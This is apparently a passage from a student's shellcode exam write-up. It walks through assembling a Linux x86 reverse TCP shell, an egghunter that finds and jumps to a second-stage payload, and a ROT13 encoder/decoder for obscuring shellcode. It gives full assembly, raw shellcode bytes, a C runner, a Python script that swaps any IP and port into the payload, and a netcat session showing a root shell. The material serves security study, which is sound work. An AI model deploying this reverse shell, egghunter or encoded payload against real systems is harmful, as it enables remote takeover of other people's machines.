If you can remember, "socketcall(SYS_SOCKET)" is reponsible for the creation of a socket, which is our first step in creating this bind shell.

This can be achieved with the syscall "socketcall(SYS_SOCKET, (AF_INET, SOCK_STREAM, 0))".

In assembly that looks like this:
Note: I've added comments to show how each instruction interacts with the syscall.

```
; [+] Setting up socketcall() for SYS_SOCKET
	; int socketcall(int call, unsigned long *args)
	; int socket(int domain, int type, int protocol)
	; EAX = socketcall()
	; EBX = SYS_SOCKET[1]
	; ECX = (int domain, int type, int protocol)
	xor    eax,eax	;
	mov    al,0x66	; setting syscall as socketcall() [REF1]
	xor    ebx,ebx	;
	push   ebx	; setting ECX param in memory - 0x0 (0 for tcp(7) stream sockets)	:	[socket_struct --> REF3]
	inc    ebx	; setting EBX 0x1 (socketcall: SYS_SOCKET[1]) 				:	[socketCall_struct --> REF4]
	push   ebx	; setting ECX param in memory - 0x1,0x0 (socket: SOCK_STREAM[1]) 	:	[socket --> REF2]
	push   0x2	; setting ECX param in memory - 0x2,0x1,0x0 (socket: AF_INET[2])	:	[socket --> REF2]
	mov    ecx,esp	; ECX points to args on stack for socket() 				:	[socket_struct --> REF3]
	int    0x80	; calling socketcalll(SYS_SOCKET, (socket(AF_INET, SOCK_STREAM, 0))	
	xor    esi,esi	;
	mov    esi,eax 	; save sockfd in ESI for future syscalls
```

## Connecting with our socket

Now that we have our socket, let's go ahead and give it the property to connect to another address.

In my case I wanted to set the inet_addr (IP) to 127.0.0.1, and sin_port (port) to 4444.

In C language that would look like this:
- inet_addr('127.0.0.1')
- sin_port(4444)


This can be achieved with the syscall "socketcalll(SYS_BIND,(ADDRESS-SYS_SOCKET-SOCKFD,ADDRESS-SYS_SOCKET-STRUCT,len(16),4444))".

In assembly that looks like this:


```
; [+] Setting up socketcall() for SYS_CONNECT
	; int socketcall(int call, unsigned long *args)
	; int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
	; EAX = socketcall
	; EBX = SYS_CONNECT[3]
	; ECX = (int sockfd, const struct sockaddr *addr, socklen_t addrlen) : 
	; Legend: If all set - 1(1,1,1). Else if not set 0(0,0,0)
	xor    eax,eax		;
	mov    al,0x66		; setting syscall as socketcall()					:	[vim /usr/include/i386-linux-gnu/asm/unistd_32.h]
	xor    ebx,ebx		; 
	mov    bl,0x3		; setting function as SYS_CONNECT					:	[socketcall --> REF1]
	xor    edx,edx		; 
	mov    edx, 0x04030382	; 127.0.0.1 flipped and converted is 0x100007f. But this will give us errors because of NULL bytes 
        sub    edx, 0x03030303	; so we put a larger number and subtract it down to 0x100007f		: 	[connect --> REF5]
	push   edx		; we then push it to stack which avoids the NULL break errors		:	[connect --> REF5]
	push   word 0x5c11	; 4444 flipped and hex encoded is 0x5c11 - pushed to stack		:	[connect --> REF5]
	push   word 0x2		; setting sa_family member of sockaddr to AF_INET (0x02)		:	[connect --> REF5]
	mov    edx,esp		; setting EDX to pointer of sockaddr struct				: 	[connect --> REF5]
	push   0x10		; pushing stocketlen_t addrlen onto stack - 0x10 == 16 bytes - 0(0,0,1)	:	[connect --> REF5]
	push   edx		; pushing address of sockaddr/struct to memory - 0(0,1,1)		:	[connect --> REF5]
	push   esi		; pushing sockfd onto stack - 0(1,1,1)					: 	[connect --> REF5]
	mov    ecx,esp		; setting ECX to address of parameters (located on stack) - 1(1,1,1)	:	[connect --> REF5]
	int    0x80		; calling socketcalll(SYS_CONNECT,(sockfd,(AF_INET(0x2),127.0.0.1,4444),addrlen(16 bytes))
```

## Setting stdin, stdout and stderr

So with most in not all *NIX systems, you have: stdin, stdout and stderr. The way systems interperet it is as integers: 0x0, 0x1, 0x2.
These 3 determine the accepted data streams. It's imperative that our shell accepts all 3 streams, so let's go ahead and do just that!

This can be achieved with the syscall "dup2(sockfd,(stderr,stdout,stdin))".

In assmebly that looks like this:

```
; [+] dup2(): setting stdin, stdout, stderr propterties to sockfd: (0x2,0x1,0x0)
        ; int dup2(int oldfd, int newfd);
        ; EAX = dup2
        ; EBX = sockfd
        ; ECX = (0x2,0x1,0x0)-1) decrementing loop
        xor    ecx,ecx  ; 
        mov    cl,0x2   ; loop counter for dup2. decrementing loop will look like: (0x2,0x1,0x00)
dup2_loop:
        push   0x3f     ; using push/pop this time for fun. same as using mov eax,0x3f          :       [vim /usr/include/i386-linux-gnu/asm/unistd_32.h]
        pop    eax      ; setting EAX to dup2() syscall                                         :       [dup2 --> REF6]
        int    0x80     ; [*] Calling: dup2(sockfd, (stderr,stdout,stdin))
        dec    ecx      ; decrementing loop counter for each iteration
        jns    dup2_loop;  loop up to dup2_loop if SF=0 (If ECX is positive int (SF=0) then loop, else if negative (0,-1 etc) then (SF=1) continue down)
```

## Our shell

We've got all our pieces in place now, all we need is to execute a shell on connection! 

This can be achieved with the syscall "execve(/bin//sh0x00)".

I think a nice simple "/bin/sh" will work perfectly for our needs.

In assmebly that looks like this:

```
; [+] execve(): executing /bin//sh      
        ; int execve(const char *pathname, char *const argv[], char *const envp[])
        ; EAX = execve
        ; EBX = /bin//sh
        ; ECX = args followed by 0x00
        xor    eax,eax          ;
        mov    al,11            ; setting EAX to execve syscall
        xor    ebx,ebx          ;
        push   ebx              ; execve requires NULLBYTE after arguments (0x00)               :       [execve --> REF7]
        push   0x68732f2f       ; sh//
        push   0x6e69622f       ; nib/ - Pushing /bin//sh onto stack in reverse for EBX         :       [execve --> REF7]
        mov    ebx,esp          ; setting EBX to address of /bin//sh
        xor    ecx,ecx          ;
        xor    esi,esi          ;
	xor    edx,edx
        int    0x80             ; [*] Calling: execve(/bin//sh0x00)
```

## Putting it all together

If you followed all the steps you should have an assembly file that looks similar to this:

```
global _start

section .text

_start:
;sys_socket:
	; [+] Setting up socketcall() for SYS_SOCKET
	; int socketcall(int call, unsigned long *args)
	; int socket(int domain, int type, int protocol)
	; EAX = socketcall()
	; EBX = SYS_SOCKET[1]
	; ECX = (int domain, int type, int protocol)
	xor    eax,eax	;
	mov    al,0x66	; setting syscall as socketcall() [REF1]
	xor    ebx,ebx	;
	push   ebx	; setting ECX param in memory - 0x0 (0 for tcp(7) stream sockets)	:	[socket_struct --> REF3]
	inc    ebx	; setting EBX 0x1 (socketcall: SYS_SOCKET[1]) 				:	[socketCall_struct --> REF4]
	push   ebx	; setting ECX param in memory - 0x1,0x0 (socket: SOCK_STREAM[1]) 	:	[socket --> REF2]
	push   0x2	; setting ECX param in memory - 0x2,0x1,0x0 (socket: AF_INET[2])	:	[socket --> REF2]
	mov    ecx,esp	; ECX points to args on stack for socket() 				:	[socket_struct --> REF3]
	int    0x80	; calling socketcalll(SYS_SOCKET, (socket(AF_INET, SOCK_STREAM, 0))	


save_sockfd:
	xor    esi,esi	;
	mov    esi,eax 	; save sockfd in ESI for future syscalls


sys_connect:
	; [+] Setting up socketcall() for SYS_CONNECT
	; int socketcall(int call, unsigned long *args)
	; int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
	; EAX = socketcall
	; EBX = SYS_CONNECT[3]
	; ECX = (int sockfd, const struct sockaddr *addr, socklen_t addrlen) : 
	; Legend: If all set - 1(1,1,1). Else if not set 0(0,0,0)
	xor    eax,eax		;
	mov    al,0x66		; setting syscall as socketcall()					:	[vim /usr/include/i386-linux-gnu/asm/unistd_32.h]
	xor    ebx,ebx		; 
	mov    bl,0x3		; setting function as SYS_CONNECT					:	[socketcall --> REF1]
	xor    edx,edx		; 
	mov    edx, 0x04030382	; 127.0.0.1 flipped and converted is 0x100007f. But this will give us errors because of NULL bytes 
        sub    edx, 0x03030303	; so we put a larger number and subtract it down to 0x100007f		: 	[connect --> REF5]
	push   edx		; we then push it to stack which avoids the NULL break errors		:	[connect --> REF5]
	push   word 0x5c11	; 4444 flipped and hex encoded is 0x5c11 - pushed to stack		:	[connect --> REF5]
	push   word 0x2		; setting sa_family member of sockaddr to AF_INET (0x02)		:	[connect --> REF5]
	mov    edx,esp		; setting EDX to pointer of sockaddr struct				: 	[connect --> REF5]
	push   0x10		; pushing stocketlen_t addrlen onto stack - 0x10 == 16 bytes - 0(0,0,1)	:	[connect --> REF5]
	push   edx		; pushing address of sockaddr/struct to memory - 0(0,1,1)		:	[connect --> REF5]
	push   esi		; pushing sockfd onto stack - 0(1,1,1)					: 	[connect --> REF5]
	mov    ecx,esp		; setting ECX to address of parameters (located on stack) - 1(1,1,1)	:	[connect --> REF5]
	int    0x80		; calling socketcalll(SYS_CONNECT,(sockfd,(AF_INET(0x2),127.0.0.1,4444),addrlen(16 bytes))


dup2_setup:
	; [+] dup2(): setting stdin, stdout, stderr propterties to sockfd: (0x2,0x1,0x0)
	; int dup2(int oldfd, int newfd);
	; EAX = dup2
	; EBX = sockfd
	; ECX = (0x2,0x1,0x0)-1) decrementing loop
	xor    ecx,ecx	; 
	mov    cl,0x2	; loop counter for dup2. decrementing loop will look like: (0x2,0x1,0x00)
dup2_loop:
	push   0x3f	; using push/pop this time for fun. same as using mov eax,0x3f		:	[vim /usr/include/i386-linux-gnu/asm/unistd_32.h]
	pop    eax	; setting EAX to dup2() syscall						:	[dup2 --> REF6]
	int    0x80	; [*] Calling: dup2(sockfd, (stderr,stdout,stdin))
	dec    ecx	; decrementing loop counter for each iteration
	jns    dup2_loop;  loop up to dup2_loop if SF=0 (If ECX is positive int (SF=0) then loop, else if negative (0,-1 etc) then (SF=1) continue down)


ExecveShell:
	; [+] execve(): executing /bin//sh	
	; int execve(const char *pathname, char *const argv[], char *const envp[])
	; EAX = execve
	; EBX = /bin//sh
	; ECX = args followed by 0x00
	xor    eax,eax		;
	mov    al,11		; setting EAX to execve syscall
	xor    ebx,ebx		;
	push   ebx		; execve requires NULLBYTE after arguments (0x00)		:	[execve --> REF7]
	push   0x68732f2f 	; sh//
	push   0x6e69622f 	; nib/ - Pushing /bin//sh onto stack in reverse for EBX		:	[execve --> REF7]
	mov    ebx,esp		; setting EBX to address of /bin//sh
	xor    ecx,ecx		;
	xor    esi,esi		;
	xor    edx,edx
	int    0x80		; [*] Calling: execve(/bin//sh0x00)
```

If you didn't you do now!

For your own sake, make sure you read over it and fully understand it. It'll help you to understand how it works on a fundamental level.


## Testing our reverse shell

So if you're not aware we can't just run assembly from the file, it first needs to be compile and then linked.

During my testing I went ahead and created a file that foes all this along with dumping the shellcode of the compiled file. Please use it to compile your assembly file:
```
# This compiles your assembly code and dumps the shellcode 

# Compile and output
nasm -f elf32 -o $1.o $1.asm; ld -d -o $1 $1.o

# Gets shellcode from output file

## Prints the shellcode in little endian

RAW=$(objdump -d "$1" | grep "^ "|awk -F"[\t]" '{print $2}')
SHELLCODE=""
COUNT=0
for word in $RAW
do
	SHELLCODE=${SHELLCODE}${word:6:2}${word:4:2}${word:2:2}${word:0:2}
	((COUNT++))
done
echo ""
echo "Shellcode: "
echo $SHELLCODE | sed 's/ //g'| sed 's/.\{2\}/\\x&/g'|paste -d '' -s
echo "Shellcode size: ${COUNT} bytes"
```


You then pass the name (NOT INCLUDING EXTENSION) as an argument to the bash file to compile and like it like so:

```
root@ubuntu:/mnt/hgfs/assembly/exam/2-Assignment# ./compile-shell-dump.sh reverse_shell_tcp

Shellcode: 
\x31\xc0\xb0\x66\x31\xdb\x53\x43\x53\x6a\x02\x89\xe1\xcd\x80\x31\xf6\x89\xc6\x31\xc0\xb0\x66\x31\xdb\xb3\x03\x31\xd2\xba\x82\x03\x03\x04\x81\xea\x03\x03\x03\x03\x52\x66\x68\x11\x5c\x66\x6a\x02\x89\xe2\x6a\x10\x52\x56\x89\xe1\xcd\x80\x31\xc9\xb1\x02\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xf6\x31\xd2\xcd\x80
Shellcode size: 97 bytes
root@ubuntu:/mnt/hgfs/assembly/exam/2-Assignment# ls
compile-shell-dump.sh  reverse_shell_tcp  reverse_shell_tcp.asm  reverse_shell_tcp.o
root@ubuntu:/mnt/hgfs/assembly/exam/2-Assignment#
```

Now we'll take the dumped shellcode and place it in a C file, we do this to confirm it works in a C program.

```
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\xb0\x66\x31\xdb\x53\x43\x53\x6a\x02\x89\xe1\xcd\x80\x31\xf6\x89\xc6\x31\xc0\xb0\x66\x31\xdb\xb3\x03\x31\xd2\xba\x82\x03\x03\x04\x81\xea\x03\x03\x03\x03\x52\x66\x68\x11\x5c\x66\x6a\x02\x89\xe2\x6a\x10\x52\x56\x89\xe1\xcd\x80\x31\xc9\xb1\x02\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xf6\x31\xd2\xcd\x80";


main(){

        printf("Shellcode Length: %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
```

Once that's done we're going to need to compile it:
```
root@ubuntu:/mnt/hgfs/assembly/exam/2-Assignment/# gcc -fno-stack-protector -z execstack testingShellcode.c -o testingShellcode
```

And we're done!

## Testing our shell

To test our shell open a new terminal and enter the following command (If you used a different port make sure to use it here instead of 4444)

This shell command will open a TCP socket connection on the specified port.

```
nc -v -l 4444
```

The terminal will hang in a listeneing state until it receives a connection on that port.


Now in a separate terminal let's run our compiled shellcode!

```
root@ubuntu:/mnt/hgfs/assembly/exam/2-Assignment/testShellcode# ./testingShellcode
Shellcode Length: 97

```

It should hang like our previous command, but if we go back to our listener...

You can see we have a shell!

```
root@ubuntu:/home/ubuntu# nc -v -l 4444
Connection from 127.0.0.1 port 4444 [tcp/*] accepted
id
uid=0(root) gid=0(root) groups=0(root)
```

I hope you enjoyed learning how to create a simple shell-reverse-tcp using shellcode!

As an added bonus, I've included a python script that allows you to dynamically restructure shellcode to allow for the swapping of IP's and ports.

```
#!/usr/bin/python
import sys,socket

if len(sys.argv) != 3:
  print "Fail!"

ipbts           = bytearray(socket.inet_aton(sys.argv[1]))
incremented     = [b+1 for b in ipbts]
ip              = "".join(["\\x" + format(b, 'x') for b in incremented])
port_number     = int(sys.argv[2])
bts             = [port_number >> i & 0xff for i in (24,16,8,0)]
filtered        = [b for b in bts if b > 0]
formatted       = ["\\x" + format(b, 'x') for b in filtered]
port            = "".join(formatted)

shellcode ="\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x01\\x31\\xc9\\x51\\x53\\x6a\\x02\\x89\\xe1"
shellcode+="\\xcd\\x80\\x31\\xff\\x89\\xc7\\x31\\xc0\\xb0\\x66\\x31\\xc9\\xb9"
print("Ip is: ")
print(ip)
shellcode+= ip # "\\x80\\x01\\x01\\x02"
shellcode+="\\x81\\xe9\\x01\\x01\\x01\\x01\\x51\\x66\\x68"
print("Port is: ")
print(port)
shellcode+= port
shellcode+="\\x43\\x66\\x53\\x89"
shellcode+="\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\x43\\xcd\\x80\\x31\\xc9\\xb1\\x02\\x31\\xc0"
shellcode+="\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\xb0\\x0b\\x31\\xdb\\x53\\x68\\x2f"
shellcode+="\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xcd\\x80";

print(shellcode)
```
```
root@ubuntu:/mnt/hgfs/assembly/exam/2-Assignment# python ip-port-changer.py 127.0.0.1 4444
Ip is: 
\x80\x1\x1\x2
Port is: 
\x11\x5c
\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x31\xff\x89\xc7\x31\xc0\xb0\x66\x31\xc9\xb9\x80\x1\x1\x2\x81\xe9\x01\x01\x01\x01\x51\x66\x68\x11\x5c\x43\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\x43\xcd\x80\x31\xc9\xb1\x02\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80
```

# Assignment 3

# Egghunter Requirements
- Study about Egg Hunter Shellcode
- Create a working egghunter demo
- Make demo configurable for different payloads

## Prerequisites

- Basic understanding of registers
- Basic understanding of stack and memory
- Basic understanding of assembly
- [Skape's paper on egghunters](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf)

## Context

What is an egghunter?

Well an egghunter is staged shellcode we use to find larger space in the memory for storing our shellcode. An egghunter must be a very small piece of code and very fast, because searching in a process' Virtual Address Space (VAS) is very CPU consuming. In an egghunter you store a short 4 byte string which must be found in memory twice (avoiding colision with egghunter itself). There are a few ways we can achieve this.


## The challenge of interacting With VAS

If you remember, we're trying to read memory addresses in process-relative VAS. 

The danger of searching a process’ VAS for an egg lies in the fact that there tend to be large regions of unallocated memory that would inevitably be encountered along the path when searching for an egg. 

Dereferencing this unallocated memory could lead to a host of bad things, most probable being the crash of the application.

So how do we work arround this?


## Approach

There are dozens are a few ways we could implement this.

For my egg hunter, I decided to make something simple and easy to create. The egg hunter will iterate through memory addresses, and compare the value at that memory address to the provided egg. If the value matches the egg, the egg hunter will jump to that memory space and execute the second stage of the shellcode payload.

The memory of the application would look something like |[egg hunter]|[random memory]|[egg]|[second stage shellcode]|[random memory]|. The egg hunter will keep searching through memory until the egg is found, and then jump to the second stage and execute.
	
## Syscalls

A feature of the Linux syscall is the ability to validate process-relative memory addresses without leading to a segmentation fault or other runtime error in the program itself. 
When a syscall encounters an invalid memory address, it will return an EFAULT error code to indicate that a pointer provided to the system call was not valid.
```
root@ubuntu:/home/ubuntu# errno 6
ENXIO		 6	/* No such device or address */
```

Fortunately for the egg hunter, this is the exact type of information it needs in order to safely traverse the process’ VAS without dereferencing the invalid memory regions that are strewn about the process.

To achieve this, we'll use the access(2) syscall.

```
global _start

section .text

_start:
	; We will EDX to track the memory we're searching
	xor edx,edx	; clear it in preparation

init_page:
	; Initializing EDX register to PAGE_SIZE(0x1000) which is 4096 bytes
	or dx,0xfff

inc_page:
	
	; inc on every loop to access() all possible VAS memory
	inc edx

sys_access:	
	; load the latest 8 bytes of EDX into EBX so we can find our 8 byte egg in the target process' VAS
	lea ebx,[edx+0x4]
	push byte +0x21	; push access() syscall onto stack
	pop eax		; set EAX to access(). push pop saves 1 byte over: xor eax,eax; mov al,0x21.
	
	; [*] Calling access(ebx[edx+0x4])
	int 0x80

	; [+] Check for error code 
	; EFAULT returns error code if access() address was invalid. 
	; EFAULTs error code low byte is 0xf2
	cmp al,0xf2	; checks return of syscall against return value, if error code: set ZF=1 

access_failure:	
	; [+] On access() failure
	jz init_page	; EFAULT error code (ZF=1) so loop up, inc edx and try again.

access_success:
	; [+] On access() success
	; [!] Our egg is 0x50905090. In this code its moved into EAX in reverse so it appears as 0x905090. 
	; [!] When hunting for the egg make sure to hunt for: 0x50905090.
	mov eax,0x90509050	; move our egg ((push eax,nop)*4) into EAX to search it
	mov edi,edx		; move value EDX into EDI (valid access() address)
	scasd			; scasd will compare EAX and EDI. If equal then ZF=1, else not equal ZF=0. scasd matching first 4 bytes
				; scasd auto increments EDI by dword (4 bytes) if DF=0. Because we have not set it DF, after execution EDI is now edi+0x4
	jnz inc_page		; If ZF=0 loop up, else if ZF=1 continue down

	scasd			; scasd auto increments so now its comparing edi+0x4. scasd matching second 4 to confirm
	jnz inc_page		; if no egg match then loop up and try again

egghunted:	
	; [+] On match
	; if scasd returns a match (ZF=1) then jump to our shellcode in EDI (that was auto incremented each time with scasd match)
	jmp edi			;
```

## Compiling our egghunter

So if you're not aware we can't just run assembly from the file, it first needs to be compile and then linked.

During my testing I went ahead and created a file that foes all this along with dumping the shellcode of the compiled file. Please use it to compile your assembly file:
```
# This compiles your assembly code and dumps the shellcode 

# Compile and output
nasm -f elf32 -o $1.o $1.asm; ld -d -o $1 $1.o

# Gets shellcode from output file

## Prints the shellcode in little endian

RAW=$(objdump -d "$1" | grep "^ "|awk -F"[\t]" '{print $2}')
SHELLCODE=""
COUNT=0
for word in $RAW
do
	SHELLCODE=${SHELLCODE}${word:6:2}${word:4:2}${word:2:2}${word:0:2}
	((COUNT++))
done
echo ""
echo "Shellcode: "
echo $SHELLCODE | sed 's/ //g'| sed 's/.\{2\}/\\x&/g'|paste -d '' -s
echo "Shellcode size: ${COUNT} bytes"
```

You then pass the name (NOT INCLUDING EXTENSION) as an argument to the bash file to compile and like it like so:
```
root@ubuntu:/mnt/hgfs/assembly/exam/3-Assignment# ./compile-shell-dump.sh egghunter

Shellcode: 
\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x50\x90\x50\x90\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7
Shellcode size: 35 bytes
```

If you remember, our egghunter will locate the egg in memory and execute the shellcode after it.

The structure for that was: 
-  |[egg hunter]|[random memory]|[egg]|[second stage shellcode]|[random memory]|.

To test this, we'll be using a reverse shell in this demonstartion. The structe should look like this:
-  |[egg hunter]|[random memory]|[egg]|[second stage shellcode]|[random memory]|

Knowing this we'll take the dumped shellcode and place it in the following C file that holds our reverse shell, we do this to confirm it works in a C program.

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define EGG "\x50\x90\x50\x90"

unsigned char egghunter[] = \
"\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x50\x90\x50\x90\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";


unsigned char shellcode[] = \
EGG
EGG
"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x31\xff\x89\xc7\x31\xc0\xb0\x66\x31\xc9\xb9\x80\x1\x1\x2\x81\xe9\x01\x01\x01\x01\x51\x66\x68\x11\x5c\x43\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\x43\xcd\x80\x31\xc9\xb1\x02\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80";


main()
{
    int shellcode_len = strlen(shellcode);
    printf("Egghunter Length:  %d\n", strlen(egghunter));
    printf("Shellcode Length:  %d\n", shellcode_len);

    // Create a buffer to place our shellcode
    char *badbuffer;
    badbuffer=malloc(shellcode_len);
    memcpy(badbuffer,shellcode,shellcode_len);

	int (*ret)() = (int(*)())egghunter;
	ret();

    free(badbuffer);

}
```

Once that's done we're going to need to compile it:
```
root@ubuntu:/mnt/hgfs/assembly/exam/2-Assignment/# gcc -fno-stack-protector -z execstack testingShellcode.c -o testingShellcode
```

And we're done!

## Testing our egghunter

To test our egghunter open a new terminal and enter the following command.

This shell command will open a TCP socket connection on the specified port.

```
nc -v -l 4444
```

The terminal will hang in a listeneing state until it receives a connection on that port.


Now in a separate terminal let's run our compiled shellcode!

```
root@ubuntu:/mnt/hgfs/assembly/exam/3-Assignment/testShellcode# ./testingShellcode
Egghunter Length:  35
Shellcode Length:  104

```

It should hang like our previous command, but if we go back to our listener...

You can see we have a shell!

```
root@ubuntu:/home/ubuntu# nc -v -l 4444
Connection from 127.0.0.1 port 4444 [tcp/*] accepted
id
uid=0(root) gid=0(root) groups=0(root)
```

I hope you enjoyed learning about egghunters and implementing them using shellcode!





# Assignment 4

# Custom Encoder Requirements
- Create a custom encoding scheme like the “Insertionon Encoder”
- PoC with using execve-stack as the shellcode to encode with your schema and execute

## Prerequisites

- Basic understanding of registers
- Basic understanding of stack and memory
- Basic understanding of assembly


## Approach

There are potentially dozens if not hundreds of methods you could use to encode our shellcode. For this assignment, I decided to go with an easy yet versatile method. The ROT13 cipher.

ROT13 ("rotate by 13 places") is a simple letter substitution cipher that replaces a letter with the 13th letter after it in the alphabet. 

Because there are 26 letters (2×13) in the basic Latin alphabet, ROT13 is its own inverse; that is, to undo ROT13, the same algorithm is applied, so the same action can be used for encoding and decoding.

This is exactly what we would like to apply in our custom encoder.

## Encoder

We'll start by creating our encoder, we'll be using python for this as it's a user friendly language and easy to create quick code in.

Our shellcode will be the reverse shell we created in Assignment 2. Don't worry though, this writeup is only about our custom encoder so you don't have to worry about creating the reverse shell. Just use my example here:

```
#!/usr/env/python
shellcode = ("\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x31\xff\x89\xc7\x31\xc0\xb0\x66\x31\xc9\xb9\x80\x01\x01\x02\x81\xe9\x01\x01\x01\x01\x51\x66\x68\x11\x5c\x43\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\x43\xcd\x80\x31\xc9\xb1\x02\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80")

rot13 = 13
maxHexSize = 256 - rot13

encoded = ""
encodedASM = ""

for hexbyte in bytearray(shellcode):
	if hexbyte < maxHexSize:
		encoded += "\\x%02x" % (hexbyte + rot13)
		encodedASM += "0x%02x," % (hexbyte + rot13)
	else:
		encoded += "\\x%02x" % (rot13 - 256 + hexbyte)
		encodedASM += "0x%02x," % (rot13 - 256 + hexbyte)


print "\n[+] Rot13 encoded shellcode is: " + encoded
print "[+] Len: " + str(len(bytearray(shellcode)))
print "\n[+] Assembly format is: " + encodedASM
print "[+] Len: " + str(len(bytearray(shellcode)))
```

If we execute the encoder script we receive our well formatted shellcode:

```
root@ubuntu:/mnt/hgfs/assembly/exam/4-Assignment# python encoder-rot13.py 

[+] Rot13 encoded shellcode is: \x3e\xcd\xbd\x73\x3e\xe8\xc0\x0e\x3e\xd6\x5e\x60\x77\x0f\x96\xee\xda\x8d\x3e\x0c\x96\xd4\x3e\xcd\xbd\x73\x3e\xd6\xc6\x8d\x0e\x0e\x0f\x8e\xf6\x0e\x0e\x0e\x0e\x5e\x73\x75\x1e\x69\x50\x73\x60\x96\xee\x77\x1d\x5e\x64\x96\xee\x50\xda\x8d\x3e\xd6\xbe\x0f\x3e\xcd\xbd\x4c\xda\x8d\x56\x86\x06\x3e\xcd\xbd\x18\x3e\xe8\x60\x75\x3c\x3c\x80\x75\x75\x3c\x6f\x76\x7b\x96\xf0\x3e\xd6\x3e\xdf\xda\x8d
[+] Len: 96

[+] Assembly format is: 0x3e,0xcd,0xbd,0x73,0x3e,0xe8,0xc0,0x0e,0x3e,0xd6,0x5e,0x60,0x77,0x0f,0x96,0xee,0xda,0x8d,0x3e,0x0c,0x96,0xd4,0x3e,0xcd,0xbd,0x73,0x3e,0xd6,0xc6,0x8d,0x0e,0x0e,0x0f,0x8e,0xf6,0x0e,0x0e,0x0e,0x0e,0x5e,0x73,0x75,0x1e,0x69,0x50,0x73,0x60,0x96,0xee,0x77,0x1d,0x5e,0x64,0x96,0xee,0x50,0xda,0x8d,0x3e,0xd6,0xbe,0x0f,0x3e,0xcd,0xbd,0x4c,0xda,0x8d,0x56,0x86,0x06,0x3e,0xcd,0xbd,0x18,0x3e,0xe8,0x60,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b,0x96,0xf0,0x3e,0xd6,0x3e,0xdf,0xda,0x8d,
[+] Len: 96
```

# Decoder

We'll take our encoded shellcode (in assembly format) and place it in the following assembly code under EncodedShellcode.

This assembly code will load the shellcode into memory, pop it into an address and run a loop for 96 cycles which is the length of our shellcode.

Once it's finished looping it'll execute "jmp short EncodedShellcode" which is now our decoded shellcode!

```
global _start

section .text

_start:
	jmp short call_shellcode

decoder:
	pop esi		; pop address of shellcode into ESI
	xor ecx,ecx	; prepare ecx loop register
	mov cl,96	; counter = 96 (length of the shellcode)

decode:
	cmp byte [esi],13 ; compare if is possible to substract value 13
	jl max_reached ; jump if less -> max_reached
	sub byte [esi], 13 ; substract value 13
	jmp short LoopOrExecute
 
max_reached:
	xor edx, edx ; zeroize EDX register
	mov dl, 0xd ; set 13 as low byte of EDX
	sub dl, byte [esi] ; 13 - byte value of the shellcode
	xor ebx, ebx ; zeroize EBX register
	mov bl, 0xff ; 0xff = 255 
	inc ebx ; = 256
	sub bx, dx ; 256 - (13 - byte value of the shellcode)
	mov byte [esi], bl ; move bl into ESI
 
LoopOrExecute:
	inc esi ; move to next byte
	loop decode ; loop "decode" if ECX > 0
	jmp short EncodedShellcode	; when ECX = 0, Execute our now decoded shellcode

call_shellcode:
	call decoder ; push address of EncodedShellcode(0x3e,0xcd,0xbd,etc,etc*91) onto stack and move EIP to decoder.
